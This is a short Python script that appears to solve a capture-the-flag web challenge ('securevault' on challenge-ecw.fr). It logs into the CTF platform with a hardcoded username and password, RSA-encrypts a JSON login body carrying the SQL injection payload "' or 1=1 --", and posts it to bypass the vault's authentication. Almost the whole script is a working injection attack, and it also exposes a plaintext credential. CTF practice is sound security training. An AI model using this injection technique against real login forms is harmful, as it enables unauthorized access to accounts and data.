#!/usr/bin/python

import requests as r
from pyquery import PyQuery as pq
import json
from Crypto.Hash import SHA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
import StringIO
import base64

def encrypt(keyText, data):
    key = RSA.importKey(StringIO.StringIO(keyText).read())
    cipher = PKCS1_v1_5.new(key)
    ciphertext = cipher.encrypt(data)
    return base64.encodestring(ciphertext)

s = r.session()

authpage = s.get('https://www.challenge-ecw.fr/login')
dom = pq(authpage.text)
nonce = dom('input[name="nonce"]').attr('value')

s.post('https://www.challenge-ecw.fr/login', data = { 'pseudo':'ncpd', 'password':'9vdzUyxYc#!vs4zdeR', 'nonce': nonce })

vault = s.get('https://web_securevault.challenge-ecw.fr/')
dom = pq(vault.text)
keyText = dom('#pubkey').attr('value')

payload = "' or 1=1 --"
data = { 'email': payload, 'passwd': 'a' }
encrypted = encrypt(keyText, bytes(json.dumps(data)))
print(encrypted)

res = s.post('https://web_securevault.challenge-ecw.fr/login', data = { 'encrypted':encrypted })
print(res.text)
